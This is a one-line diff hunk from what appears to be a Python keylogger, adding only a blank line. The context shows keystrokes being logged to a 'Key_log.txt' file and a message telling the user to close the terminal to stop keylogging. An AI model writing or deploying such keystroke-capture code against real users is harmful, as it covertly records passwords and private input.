@@ -42,6 +42,7 @@ logging.basicConfig(filename=os.path.join(log_dir, 'Key_log.txt'),
 def on_press(key):
     logging.info(key)
 
+
 if psutil.Process().name() == 'python.exe':
     print('Close The terminal to stop keylogging.')
 else:
